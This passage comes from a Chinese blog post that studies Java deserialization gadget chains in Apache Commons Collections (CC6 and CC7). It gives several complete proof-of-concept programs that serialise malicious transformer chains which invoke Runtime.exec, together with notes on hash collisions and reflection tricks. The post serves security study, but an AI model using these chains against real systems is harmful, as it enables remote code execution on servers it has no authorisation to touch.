class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)<br>        &#125;;<br>        ChainedTransformer fakechainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;);<br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm,fakechainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-string">&quot;a&quot;</span>);<br><br>        HashMap exphm = <span class="hljs-keyword">new</span> HashMap();<br>        exphm.put(tiedMapEntry,<span class="hljs-string">&quot;c&quot;</span>);<br><br>        decorate.remove(<span class="hljs-string">&quot;a&quot;</span>);<br><span class="hljs-comment">//        decorate.clear();</span><br><br>        Field iTransformersF = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        iTransformersF.setAccessible(<span class="hljs-keyword">true</span>);<br>        iTransformersF.set(fakechainedTransformer,transformers);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(exphm);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="②-白袍师傅改-yso"><a href="#②-白袍师傅改-yso" class="headerlink" title="② 白袍师傅改 yso"></a>② 白袍师傅改 yso</h4><p>很像 yso 的链，照猫画虎</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC6;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6EzbyBAIPAO</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)<br>        &#125;;<br>        ChainedTransformer fakechainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;);<br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm,fakechainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-string">&quot;a&quot;</span>);<br><br>        HashSet hs = <span class="hljs-keyword">new</span> HashSet();<br>        hs.add(tiedMapEntry);<br><br>        decorate.remove(<span class="hljs-string">&quot;a&quot;</span>);<br><span class="hljs-comment">//        decorate.clear();</span><br><br>        Field iTransformersF = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        iTransformersF.setAccessible(<span class="hljs-keyword">true</span>);<br>        iTransformersF.set(fakechainedTransformer,transformers);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(hs);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>但这个链和 yso 的还是有一定的差距的，这个链往<code>LazyMap-&gt;TiedMapEntry-&gt;HashSet</code>添加假链后反射修改，思路简单</p><h4 id="③yso"><a href="#③yso" class="headerlink" title="③yso"></a>③yso</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC6;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, IOException </span>&#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;);<br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm, chainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-string">&quot;a&quot;</span>);<br>        HashSet hs = <span class="hljs-keyword">new</span> HashSet(<span class="hljs-number">1</span>);<span class="hljs-comment">//必须得设置值1 后续才能取值map</span><br>        hs.add(<span class="hljs-string">&quot;c&quot;</span>);<br><br>        Field mapF = HashSet.class.getDeclaredField(<span class="hljs-string">&quot;map&quot;</span>);<br>        mapF.setAccessible(<span class="hljs-keyword">true</span>);<br>        HashMap hm_tmp = (HashMap) mapF.get(hs);<br><br>        Field tableF = HashMap.class.getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);<br>        tableF.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object[] arr = (Object[]) tableF.get(hm_tmp);<br><br>        Object node = arr[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span> (node == <span class="hljs-keyword">null</span>) &#123;<br>            node = arr[<span class="hljs-number">1</span>];<br>        &#125;<br><br>        Field keyF = node.getClass().getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        keyF.setAccessible(<span class="hljs-keyword">true</span>);<br>        keyF.set(node, tiedMapEntry);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(hs);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先是 new 了一个为 1 的初化容量，加了一个无关紧要的键，通过反射取出<code>map(HashMap)</code>，再反射取出 在反射取出的<code>map</code>里面的<code>table</code>并置于一个 object 数组，数组做一个判断，取出非空的[0]或[1]元素</p><p>通过反射最后将添加的无关紧要的元素替换为 evil 链</p><p>有点难…</p><p><a href="https://www.yuque.com/tianxiadamutou/zcfd4v/ac9529#72fa7c88-6">https://www.yuque.com/tianxiadamutou/zcfd4v/ac9529#72fa7c88-6</a></p><h2 id="CommonsCollections7"><a href="#CommonsCollections7" class="headerlink" title="CommonsCollections7"></a>CommonsCollections7</h2><h3 id="Pre-6"><a href="#Pre-6" class="headerlink" title="Pre"></a>Pre</h3><h4 id="限制-6"><a href="#限制-6" class="headerlink" title="限制"></a>限制</h4><blockquote><p>jdk 暂无限制</p><p>CommonsCollections 3.1 - 3.2.1</p></blockquote><h4 id="利用链-6"><a href="#利用链-6" class="headerlink" title="利用链"></a>利用链</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus">java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.Hashtable</span><span class="hljs-selector-class">.readObject</span><br>java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.Hashtable</span><span class="hljs-selector-class">.reconstitutionPut</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.map</span><span class="hljs-selector-class">.AbstractMapDecorator</span><span class="hljs-selector-class">.equals</span><br>java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.AbstractMap</span><span class="hljs-selector-class">.equals</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.map</span><span class="hljs-selector-class">.LazyMap</span><span class="hljs-selector-class">.get</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.functors</span><span class="hljs-selector-class">.ChainedTransformer</span><span class="hljs-selector-class">.transform</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.functors</span><span class="hljs-selector-class">.InvokerTransformer</span><span class="hljs-selector-class">.transform</span><br>java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.Method</span><span class="hljs-selector-class">.invoke</span><br>sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.DelegatingMethodAccessorImpl</span><span class="hljs-selector-class">.invoke</span><br>sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.NativeMethodAccessorImpl</span><span class="hljs-selector-class">.invoke</span><br>sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.NativeMethodAccessorImpl</span><span class="hljs-selector-class">.invoke0</span><br>java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Runtime</span>.exec<br></code></pre></td></tr></table></figure><h4 id="关键类-6"><a href="#关键类-6" class="headerlink" title="关键类"></a>关键类</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">HashTable</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">Transformer</span><br><span class="hljs-attribute">ConstantTransformer</span><br><span class="hljs-attribute">InvokerTransformer</span><br><span class="hljs-attribute">ChainedTransformer</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">HashMap</span><br><span class="hljs-attribute">LazyMap</span><br></code></pre></td></tr></table></figure><p>先不说具体的链，在这个链的地方发现一个很有趣的东西，先拿出来讲，作知识铺垫</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hash</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;yy&quot;</span>.hashCode());<br>        System.out.println(<span class="hljs-string">&quot;zZ&quot;</span>.hashCode());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个东西叫<a href="https://www.h5w3.com/164057.html">hash 冲突</a>，我们看下代码<code>String#hashCode</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hashCode</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> h = hash;<br>    <span class="hljs-keyword">if</span> (h == <span class="hljs-number">0</span> &amp;&amp; value.length &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">char</span> val[] = value;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; value.length; i++) &#123;<br>            h = <span class="hljs-number">31</span> * h + val[i];<br>        &#125;<br>        hash = h;<br>    &#125;<br>    <span class="hljs-keyword">return</span> h;<br>&#125;<br></code></pre></td></tr></table></figure><p>可见是将 String 分为字符一位一位根据<strong>ASCII</strong>做一个运算</p><blockquote><p>yy：第一次 y 的 ascii121，第二次 31*121+121=3872</p><p>zZ：第一次 z 的 ascii122，第二次 31*122+90=3872</p></blockquote><p>还有其他的：</p><blockquote><p>CC == Bb<br>DD == Cc<br>BBBB == BBAa</p></blockquote><p>CC7 前半段仍然是用的 CC1 的链，CC1 中是通过<code>AnnotationInvocationHandler.invoke</code>来触发对恶意代理<code>handler</code>调用其<code>invoke</code>方法从而触发<code>LazyMap.get</code>方法，CC7 则是通过<code>AbstractMap.equals</code>来触发对<code>LazyMap.get</code>方法的调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (!value.equals(m.get(key)))<br></code></pre></td></tr></table></figure><p>这里 m 设置为<code>LazyMap</code>即可 RCE</p><p>进一步地使用了<code>HashTable</code>作为复写点，调用了<code>HashTable.reconstitutionPut</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;<br></code></pre></td></tr></table></figure><p>对应到<code>writeObject</code>可知，<code>HashTable.put</code>键值</p><p>这个不会写，直接贴出来</p><h3 id="Gadget-6"><a href="#Gadget-6" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC7;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC7</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        ChainedTransformer fakechainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;);<br><br>        Map map1 = LazyMap.decorate(<span class="hljs-keyword">new</span> HashMap(), fakechainedTransformer);<br>        Map map2 = LazyMap.decorate(<span class="hljs-keyword">new</span> HashMap(), fakechainedTransformer);<br>        map1.put(<span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-number">2</span>);<br>        map2.put(<span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-number">2</span>);<br><br>        Hashtable ht = <span class="hljs-keyword">new</span> Hashtable();<br>        ht.put(map1, <span class="hljs-number">2</span>);<br>        ht.put(map2, <span class="hljs-number">2</span>);<br>        map2.remove(<span class="hljs-string">&quot;yy&quot;</span>);<br><br>        Field iTransformersF = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        iTransformersF.setAccessible(<span class="hljs-keyword">true</span>);<br>        iTransformersF.set(fakechainedTransformer, transformers);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(ht);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>一些细节：</p><p><code>AbstractMap</code>是<code>HashMap</code>的父类，因此在<code>HashTable.reconstitutionPut</code>调用<code>LazyMap.equals</code>即可</p><p>第二个得<code>HashTable.put</code>两次，不然在复写点走进<code>reconstitutionPut</code>不会进入 for</p><p><code>Hashtable.put</code>方法新增的元素，是存储在<code>Hashtable$Entry</code>这个内部类里面的，那么获取元素也是在这个内部类获取的</p><p><code>LazyMap.put</code>方法新增的元素，是调用<code>LazyMap.map.put</code>方法新增的，当<code>map</code>属性为<code>HashMap</code>对象的时候，新增的元素是存储在<code>HashMap$Node</code>内部类里面的，注意<code>LazyMap</code>类没有 put 方法，调用的是其父类的 put 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">reconstitutionPut</span><span class="hljs-params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span></span><br><span class="hljs-function">    <span class="hljs-keyword">throws</span> StreamCorruptedException</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (value == <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> java.io.StreamCorruptedException();<br>    &#125;<br>    <span class="hljs-comment">// Makes sure the key is not already in the hashtable.</span><br>    <span class="hljs-comment">// This should not happen in deserialized version.</span><br>    <span class="hljs-keyword">int</span> hash = key.hashCode();<br>    <span class="hljs-keyword">int</span> index = (hash &amp; <span class="hljs-number">0x7FFFFFFF</span>) % tab.length;<br>    <span class="hljs-keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="hljs-keyword">null</span> ; e = e.next) &#123;<br>        <span class="hljs-keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> java.io.StreamCorruptedException();<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// Creates the new entry.</span><br>    <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>        Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];<br>    tab[index] = <span class="hljs-keyword">new</span> Entry&lt;&gt;(hash, key, value, e);<br>    count++;<br>&#125;<br></code></pre></td></tr></table></figure><p>第一次添加元素时，显然 for 中的 if 是不满足的，因此要添加两次，值为<code>yy zZ</code>，因为<code>e.hash==hash</code>是 hashCode 算法导致的 hash 冲突</p><p>第三个，<code>decorate</code>封装的 innermap 不能是同一个<code>HashMap</code></p><p>第四个，最后还要移除 map2 的 yy 键</p><p>在没有移除这个键的时候调试发现确实 map2 多出来了这个键</p><p><img 